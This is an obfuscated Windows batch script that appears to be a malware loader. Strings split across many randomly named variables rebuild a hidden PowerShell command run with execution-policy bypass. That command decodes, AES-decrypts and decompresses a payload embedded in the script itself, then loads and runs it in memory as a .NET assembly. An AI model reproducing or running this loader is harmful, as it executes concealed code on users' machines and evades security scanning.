@echo off
set "MNIkbsuPHB=.IO."
set "ngxAtLaJLD=ddin"
set "lgGcwIIbGr== $s"
set "GnlBTWRfaD=a = "
set "HmyCBQkkYp=ach "
set "OMqiLvETvs=[Sys"
set "AlwDlRmRsD==');"
set "TSwwWtNIPz=oin "
set "LiumFwHUBn=, (,"
set "zksTjqTdUQ=;$TS"
set "ikbEPSqBnO=KLtP"
set "pPBVsKeDLH=, $c"
set "lXiVDUXYUP=ress"
set "HNFolxxSRQ=);$Z"
set "eBYWMRONxL=]::("
set "kRDCeCCqCU=::('"
set "ZYCcCzPrTp=gRQC"
set "esBkwkZdlF=Jq);"
set "jTXyVhJyZo=vert"
set "sySUHbLoAd=Comp"
set "wQIkzsbPXx=th('"
set "rhqTQmaYwd=and "
set "WDueBjdJwv=QCi "
set "MuKyLYfZCe=BC;$"
set "fKixBmRwXl=Mode"
set "VuJvHqQJmX=  $g"
set "GVovmqKXik=);$s"
set "PNvhjewWhD=Secu"
set "AkSspvXAGX=comm"
set "OQiyOhkOTc=nCF."
set "skwnvgkpba=Obje"
set "utTwnUUdmB=)))"
set "XqPQdtakOL=d.Pa"
set "vnLLUrcGRO=;$Jx"
set "onlDOjyIlO=WHsa"
set "CDQBAovJgX=6] -"
set "hxExjkCbMO=ewLi"
set "aPFuNqCDRY=1] -"
set "QVfcFuDVYm=PTtG"
set "xgLLjbrjYG=ptog"
set "MaWBuXGfYe=Fina"
set "AAKbStyltZ=();$"
set "JqBAfiqyeP=comp"
set "rjzWJJMiRY=-joi"
set "WBziZoqnQD=-4] "
set "VOIPaEfsKP=embl"
set "bdYbsByslL=stem"
set "XbsDhYSTdc=in $"
set "swdayMGBkO='gni"
set "UyMBFnmtyR=:: '"
set "kqvETsQUIG=ne);"
set "gZGetwNJif=Jq.T"
set "mOjAsATdMj=pres"
set "ndswplliku=Lgld"
set "bRNiSknkID=nage"
set "arYwSfyaLT=oryS"
set "rBqwyOvgFb=ew-O"
set "xuUTfCNEEV=ddin"
set "OBondIHfOA=tem."
set "MffOyqHbLQ=($gR"
set "zbXAxOwcIi=bypa"
set "oOIhzPhtAW=ment"
set "poFRlKPVvD=);$s"
set "TlNLixrxkt=gsYZ"
set "irPKfjiTnz=stem"
set "IyqOWBQpOX=rity"
set "CzejVQwhKq=sLgl"
set "YxuzHZiJOD=; };"
set "CZXBoERjyk= '')"
set "WZNAmoiEkb=Si ="
set "jGriYzvwJf=gMod"
set "hQlPxqXVYz=bstr"
set "oGDobtqNvh=P = "
set "HKrVaTassM= [Sy"
set "qnHGFJqUMJ=sa);"
set "qKXgnxXkLY=Syst"
set "kVErAtPlrR=106u"
set "YHMRJzEvUp=raph"
set "rCGSKnGJEu=New-"
set "BtiogPnsAM=m.IO"
set "wDhBmxRwos=i.Su"
set "mBjvCIsKyS=ct S"
set "lIZdoAyFSG=Jq ="
set "VGwCMIsujM=.Cop"
set "yUsfmDfAiw=qJd "
set "kSJcVuUPZr=ress"
set "pRDOARPWYr=Obje"
set "OJXpuhctdc=$sLg"
set "uajLHZUQaI=m(, "
set "wcbMnMpYRy=;$af"
set "SJZmUjybNR=ose("
set "bRqtBldmDb=yste"
set "hFWttLqIjx=eYYS"
set "xhihZVkNvy=Lgld"
set "dUHzknJDls=yTo("
set "BpHbjEMSLh=PKCS"
set "nbOKeDvjSS=GLL."
set "sNOINWQryE=bjec"
set "hPeEFTUZlH=-nop"
set "sPrEmBPLDk=kYvB"
set "UigWmRFlPg=t Sy"
set "znZCSGscnV=)) {"
set "LDJzzYfqME=Conv"
set "SbuaieTrIN=$cWH"
set "wVgAxNQWai=Bmor"
set "EHFuMmbwpB=nirt"
set "JmbagllXuC=form"
set "KfEzmJwooa=raph"
set "HRhaDaIoTQ=F = "
set "owzROSfJam=('Tg"
set "DZuhkaLOus=Invo"
set "lFImjCIYGp=rofi"
set "QVwKQGlnIc= [Sy"
set "xmkWJRafmJ=zHhH"
set "KhICbUxWBY=3); "
set "tkRhrUqWIU=tion"
set "uRUXijsAIJ=.Len"
set "mBlgsysuts=).Sp"
set "lKcfkwHCbi=Syst"
set "BinkeIvwtE=F'[-"
set "QcCzdAXPQW=rt]:"
set "YeIAQLsQeG=onve"
set "LksDdHKoAD=yste"
set "crtyHbmODM=[]] "
set "yckIEyUDNj=qJd."
set "RFQyAoNrxr=oXJq"
set "TLsflibBsb=fGLL"
set "mfHMLEYiQF=($gR"
set "gRpJxAcDPD=flec"
set "ALtgacLYzG=UULg"
set "FMPTcIzbCX=y.Pa"
set "oAXbCFOgIq=join"
set "kgDJSkpMIN=eam("
set "sPEYkGjaUu=)($c"
set "JJCSscLWSP=)($g"
set "sEIrWRdNEl=em.C"
set "rEUcUpwgEM=Disp"
set "NZDabObYXk=gth)"
set "PdKdmdRtar=i) {"
set "zffvKVeLVg=PxEW"
set "gzcivZrVQV=[Env"
set "HApohGjcAJ= '')"
set "IRorZefpdP=ring"
set "WsIzzcjHhk=.Dis"
set "LpImTsdguh=1..-"
set "cVafpwbSzd=ct S"
set "kHbijfUEVB=ke($"
set "lJWXzmLQWO=Secu"
set "QyxrsppFeP=16] "
set "hKfjGqKXfC=.-16"
set "YPpcFfikmG= = N"
set "GNCCugBliQ=pose"
set "FvBPnEkduc=]::("
set "BDSsbhhfqm= = $"
set "JZdqFxREAC=-Obj"
set "MuWHKfWCcZ=] -j"
set "QynbxzgMCU=ptog"
set "FuXGFmxKrm=rity"
set "MCKCsIujGK= = ["
set "gSTSJzKBUZ=g = "
set "ThztnCvKXr=Disp"
set "KUgKOmGUyk=YxVw"
set "chPypahmPT=$ZoX"
set "sreJfahGqd=ptor"
set "lUVduUZqYt=.Key"
set "fCShAJVjbc=();$"
set "iLaFXhhWjf=pher"
set "IEgRklEJxR=em.I"
set "RXuUbOmBJi=fore"
set "UMOQmRPoMp=sa ="
set "zAAoSPIzSK=[-1."
set "MZRYgYuGUC=7;$s"
set "RtXSbgiqMK=[IO."
set "PYUepguLVI=e = "
set "gyTLpGRtbi=Star"
set "unkoHZQfmd=$ZoX"
set "oPLHjdcndt=a = "
set "NDRPRxvwau=cWHs"
set "oWPgDahHWF=ateD"
set "ehgfhqbjnv=S46e"
set "zLruXHztbP=ing("
set "ITfpErIXxO=O.Me"
set "mEGDUfhHxF=ert]"
set "CpCCjyUYPg== [S"
set "OJfnpUuffm=IKLt"
set "xExNwiQfsS= = $"
set "iJiTIFBbhN=oL'["
set "CRcuwtLaQe=('%~f0'"
set "uMGuUWuQSm=y]::"
set "YmcxLKYWFV=tsWi"
set "ZPLPQlTayI=]::C"
set "JCJpPyBast=pStr"
set "pQMOTrmTWw=daeR"
set "KqeFzDSuMa=);$a"
set "mAbCokbHpI=.Sec"
set "WOEabiTtFA=:('g"
set "CbiGbLEhgC=eMVs"
set "ruRZLjMMEl=brea"
set "vPOSuwVuNr=morF"
set "KtmAfwnroo=Comp"
set "vYPFAzpwko=CF, "
set "PEgZbojGnN=;$UU"
set "MCjGmtAAZQ=$ZoX"
set "SIHJnkOvRB=..-1"
set "iIjUJYiTid=dj0C"
set "gorLpcnmJy='txe"
set "FHUlFhUWcO=RmAx"
set "pRMILjvukH=urit"
set "EGdPDjuMvb=$cWH"
set "jNJIUAzrnh=lit("
set "usUBNnDCtB=$IKL"
set "SxDAMQUrpB=gjYA"
set "wMezzhsmej=oint"
set "kwgCCifzfk=rtS4"
set "fKtTjdjCIv=hy.A"
set "rkZaLsyrSm=.Cre"
set "QjZTupffPi=cWHs"
set "xSErOKfIiS=ld.I"
set "gOJtopVvUy=;$TS"
set "zcrvwHWfaG=zuZI"
set "PpCrUwafrE=Stre"
set "UMyhYOdXNu=.Dis"
set "QtpmpUabLi=join"
set "NBhypjqlNh=ss -"
set "UoXHojzHzI=saBm"
set "HRXEtkiyVV=..-1"
set "RnhfIKtwcZ=ispo"
set "QwGYoNNdnQ=);$I"
set "IliMJLrSIB=e]::"
set "yzdlfeDSDM='0Pg"
set "SzUfevYuuV=null"
set "YUkRQvcEQj=tem."
set "krjtdBscEZ=();$"
set "rQIhFmkAIM=-ep "
set "AZHjqTagvW=esaB"
set "WGxvZwGzTh=('da"
set "cYMZNsupll=sion"
set "UuNJXNydLt=]::N"
set "vbQFtDFomW=CFxo"
set "ewOumfUrhz=File"
set "BaPPAhUaXL='')("
set "BEEmCONMcd=y.Ci"
set "hPRcQcaGqr=esMa"
set "PkhuPSRSFy=ionM"
set "djBBtkULsY=tS46"
set "HTPDarLlfq=ecry"
set "lvGgYMDuxa=TllA"
set "eQDGCQVxMA=V = "
set "glXkhnDgpZ=m.Re"
set "NBODrlNeFM= if "
set "SOkbMYXXgj=mory"
set "TgwTRooInm=s75K"
set "SvAYFUrore=QCi."
set "nKBKTdkpTV=m.IO"
set "iRctWmeBrW=ode]"
set "irvEuPedej='[-1"
set "nYyTRytKhT=le  "
set "bwvaCpRkXw=oArr"
set "bhXCPIoEsf=ect "
set "vucipwqwYo=yste"
set "AwLbCXCfsx=L4Yi"
set "bqcYfQIjSw=$eYY"
set "ZSPWUcYcRk=pose"
set "jPIlPDJlxW=gnir"
set "cvZZgIHGEG=Lgld"
set "amorbAOEEs=$Jxn"
set "VSCuVHowpU=ion."
set "ijryUSdlPm=y.Cr"
set "PXmSAodQVU=-1.."
set "csaXrtjdAI=l5E7"
set "vVkBBaqbjT='[-1"
set "AcxegYKGQa=::De"
set "RVeQKlIEmQ=.Con"
set "ibMvfvCADn=.Com"
set "bADyoGaFAY= [st"
set "nRwePtxXCO===')"
set "phLyHnWkbZ=.Mod"
set "GIfHpnatGa=ay()"
set "oMHBrEBwlq=ose("
set "ZJHfDPAoSH=Jd.T"
set "UidTXDQxTw=JxnC"
set "gBvvPTsVoN=trea"
set "SBrTvpKvzy=$TSq"
set "CTstPLmMEF=k; }"
set "YFzDHLDMMp=-joi"
set "hhntEmHcbo=.Cry"
set "DCUqVEOeAz=cWHs"
set "TykNTVpqYT=Lgld"
set "WmyOttbxoE=New-"
set "rwWjVvdaQr=.Cry"
set "dEhBwsFMBS=am;$"
set "wCntYiVvwy=lBlo"
set "FbvDozzBRx=kYvB"
set "yacIArWvRy=('%*'"
set "etUTnYpWyU=tem."
set "qaKvKgZIcY=a, 0"
set "usJfwYuEUL=n ''"
set "KWvZXmqXis=ress"
set "SmQgruhDHb=ypto"
set "pteYrqgjeX=Lgt "
set "fbvghiTXWo=d;$s"
set "jZkHVfpjVI=iron"
set "EKFVwWgIzg=rans"
set "PYWgQqNcQJ=grap"
set "NPnUACUgrG=t.En"
set "kFVmUagTpO=Lgld"
set "jcVtPMIGYr=ck($"
set "aKlPQqrsvV=.Ass"
set "RZkDcixiNR=orF'"
set "RatWGqWieT=6esa"
set "iMqVtHviVN=tP.D"
set "kMpCDucdlK=.Mem"
set "mLZEVafVng=.GZi"
set "pagGATIWxu=WHsa"
%tSMPooUorS%%JEoXjNZYcr%%HaMviZhjqd%%EQCRlgBivb%%OwtBgqFNXF%%bhDtdtfrGp%%gKYonSbxLc%%mRDaClGkpS%%ttlLbxmiNS%%akBfVexenn%%oibVtjEDQS%%MVbOWMynmQ%%GSJTbbpxfy%%NBWbDksqsS%%TJsUffiNji%%FkSxHvzhTr%%TgxsflYZlL%%uiVuXWAPOV%%SCoXSCJzuh%%LkwaYMmZOT%%gjCxNxpyAL%%VKtYyqSAzD%%CzFdakLUvk%%KAaUPJaQjv%%mlYJmbRyBH%%ULAlrGDyxD%%MucpauJyjO%%qcqeqrAVRZ%%tmsNqYaODi%%fCtGIRiJIR%%rspMrSvwVa%%gIGxjzcoZc%%tVVbJNIJvy%"%~dp0%~nx0.exe"
cls
%EwKNbpfoGt%%ajhIuepRLv%
"%~nx0.exe" %hPeEFTUZlH%%lFImjCIYGp%%nYyTRytKhT%%rQIhFmkAIM%%zbXAxOwcIi%%NBhypjqlNh%%AkSspvXAGX%%rhqTQmaYwd%%bqcYfQIjSw%%WZNAmoiEkb%%QVwKQGlnIc%%irPKfjiTnz%%MNIkbsuPHB%%ewOumfUrhz%%FvBPnEkduc%%gorLpcnmJy%%lvGgYMDuxa%%pQMOTrmTWw%%irvEuPedej%%SIHJnkOvRB%%aPFuNqCDRY%%QtpmpUabLi%%HApohGjcAJ%%CRcuwtLaQe%%mBlgsysuts%%jNJIUAzrnh%%gzcivZrVQV%%jZkHVfpjVI%%oOIhzPhtAW%%UuNJXNydLt%%hxExjkCbMO%%kqvETsQUIG%%RXuUbOmBJi%%HmyCBQkkYp%%mfHMLEYiQF%%WDueBjdJwv%%XbsDhYSTdc%%hFWttLqIjx%%PdKdmdRtar%%NBODrlNeFM%%MffOyqHbLQ%%SvAYFUrore%%gyTLpGRtbi%%YmcxLKYWFV%%wQIkzsbPXx%%UyMBFnmtyR%%znZCSGscnV%%VuJvHqQJmX%%FbvDozzBRx%%xExNwiQfsS%%ZYCcCzPrTp%%wDhBmxRwos%%hQlPxqXVYz%%zLruXHztbP%%KhICbUxWBY%%ruRZLjMMEl%%CTstPLmMEF%%YxuzHZiJOD%%SbuaieTrIN%%UMOQmRPoMp%%HKrVaTassM%%bdYbsByslL%%RVeQKlIEmQ%%jTXyVhJyZo%%eBYWMRONxL%%swdayMGBkO%%kwgCCifzfk%%RatWGqWieT%%wVgAxNQWai%%BinkeIvwtE%%LpImTsdguh%%QyxrsppFeP%%rjzWJJMiRY%%VAOzihmTGf%%JJCSscLWSP%%sPrEmBPLDk%%GVovmqKXik%%cvZZgIHGEG%%YPpcFfikmG%%rBqwyOvgFb%%sNOINWQryE%%UigWmRFlPg%%hzKCSAeDBr%%mAbCokbHpI%%pRMILjvukH%%ijryUSdlPm%%SmQgruhDHb%%PYWgQqNcQJ%%fKtTjdjCIv%%hPRcQcaGqr%%bRNiSknkID%%fbvghiTXWo%%kFVmUagTpO%%phLyHnWkbZ%%PYUepguLVI%%idJbgvWAoR%%etUTnYpWyU%%lJWXzmLQWO%%FuXGFmxKrm%%rwWjVvdaQr%%QynbxzgMCU%%KfEzmJwooa%%BEEmCONMcd%%iLaFXhhWjf%%fKixBmRwXl%%ZPLPQlTayI%%MuKyLYfZCe%%CzejVQwhKq%%XqPQdtakOL%%ngxAtLaJLD%%gSTSJzKBUZ%%OMqiLvETvs%%YUkRQvcEQj%%PNvhjewWhD%%IyqOWBQpOX%%hhntEmHcbo%%xgLLjbrjYG%%YHMRJzEvUp%%FMPTcIzbCX%%xuUTfCNEEV%%jGriYzvwJf%%IliMJLrSIB%%BpHbjEMSLh%%MZRYgYuGUC%%ndswplliku%%lUVduUZqYt%%MCKCsIujGK%%qKXgnxXkLY%%sEIrWRdNEl%%YeIAQLsQeG%%QcCzdAXPQW%%WOEabiTtFA%%EHFuMmbwpB%%ehgfhqbjnv%%UoXHojzHzI%%RZkDcixiNR%%zAAoSPIzSK%%hKfjGqKXfC%%MuWHKfWCcZ%%TSwwWtNIPz%%BaPPAhUaXL%%yzdlfeDSDM%%TgwTRooInm%%CbiGbLEhgC%%kVErAtPlrR%%QVfcFuDVYm%%TlNLixrxkt%%AwLbCXCfsx%%zcrvwHWfaG%%iIjUJYiTid%%csaXrtjdAI%%SxDAMQUrpB%%AlwDlRmRsD%%OJXpuhctdc%%xSErOKfIiS%%eQDGCQVxMA%%hsLXUjAnfF%%OBondIHfOA%%LDJzzYfqME%%mEGDUfhHxF%%kRDCeCCqCU%%jPIlPDJlxW%%djBBtkULsY%%AZHjqTagvW%%vPOSuwVuNr%%vVkBBaqbjT%%HRXEtkiyVV%%CDQBAovJgX%%oAXbCFOgIq%%CZXBoERjyk%%owzROSfJam%%FHUlFhUWcO%%vbQFtDFomW%%xmkWJRafmJ%%zffvKVeLVg%%KUgKOmGUyk%%nRwePtxXCO%%gOJtopVvUy%%yUsfmDfAiw%%lgGcwIIbGr%%xhihZVkNvy%%rkZaLsyrSm%%oWPgDahHWF%%HTPDarLlfq%%sreJfahGqd%%krjtdBscEZ%%NDRPRxvwau%%GnlBTWRfaD%%SBrTvpKvzy%%ZJHfDPAoSH%%EKFVwWgIzg%%JmbagllXuC%%MaWBuXGfYe%%wCntYiVvwy%%jcVtPMIGYr%%DCUqVEOeAz%%qaKvKgZIcY%%pPBVsKeDLH%%pagGATIWxu%%uRUXijsAIJ%%NZDabObYXk%%zksTjqTdUQ%%yckIEyUDNj%%rEUcUpwgEM%%SJZmUjybNR%%poFRlKPVvD%%TykNTVpqYT%%UMyhYOdXNu%%ZSPWUcYcRk%%AAKbStyltZ%%UidTXDQxTw%%HRhaDaIoTQ%%WmyOttbxoE%%pRDOARPWYr%%mBjvCIsKyS%%LksDdHKoAD%%BtiogPnsAM%%kMpCDucdlK%%arYwSfyaLT%%gBvvPTsVoN%%uajLHZUQaI%%EGdPDjuMvb%%qnHGFJqUMJ%%chPypahmPT%%lIZdoAyFSG%%zFzmwgsDgX%%JZdqFxREAC%%bhXCPIoEsf%%lKcfkwHCbi%%IEgRklEJxR%%ITfpErIXxO%%SOkbMYXXgj%%PpCrUwafrE%%dEhBwsFMBS%%OJfnpUuffm%%oGDobtqNvh%%rCGSKnGJEu%%skwnvgkpba%%cVafpwbSzd%%bRqtBldmDb%%nKBKTdkpTV%%ibMvfvCADn%%mOjAsATdMj%%cYMZNsupll%%mLZEVafVng%%JCJpPyBast%%kgDJSkpMIN%%amorbAOEEs%%vYPFAzpwko%%RtXSbgiqMK%%KtmAfwnroo%%KWvZXmqXis%%VSCuVHowpU%%sySUHbLoAd%%lXiVDUXYUP%%PkhuPSRSFy%%iRctWmeBrW%%AcxegYKGQa%%JqBAfiqyeP%%kSJcVuUPZr%%QwGYoNNdnQ%%ikbEPSqBnO%%VGwCMIsujM%%dUHzknJDls%%unkoHZQfmd%%esBkwkZdlF%%usUBNnDCtB%%iMqVtHviVN%%RnhfIKtwcZ%%nFrFXbtJAu%%vnLLUrcGRO%%OQiyOhkOTc%%ThztnCvKXr%%oMHBrEBwlq%%HNFolxxSRQ%%RFQyAoNrxr%%WsIzzcjHhk%%GNCCugBliQ%%fCShAJVjbc%%QjZTupffPi%%oPLHjdcndt%%MCjGmtAAZQ%%gZGetwNJif%%bwvaCpRkXw%%GIfHpnatGa%%PEgZbojGnN%%pteYrqgjeX%%CpCCjyUYPg%%vucipwqwYo%%glXkhnDgpZ%%gRpJxAcDPD%%tkRhrUqWIU%%aKlPQqrsvV%%VOIPaEfsKP%%uMGuUWuQSm%%WGxvZwGzTh%%iJiTIFBbhN%%PXmSAodQVU%%WBziZoqnQD%%YFzDHLDMMp%%usJfwYuEUL%%sPEYkGjaUu%%onlDOjyIlO%%KqeFzDSuMa%%TLsflibBsb%%BDSsbhhfqm%%ALtgacLYzG%%NPnUACUgrG%%iWqjnhyLEr%%wMezzhsmej%%wcbMnMpYRy%%nbOKeDvjSS%%DZuhkaLOus%%kHbijfUEVB%%SzUfevYuuV%%LiumFwHUBn%%bADyoGaFAY%%IRorZefpdP%%crtyHbmODM%%yacIArWvRy%%utTwnUUdmB%
exit /b
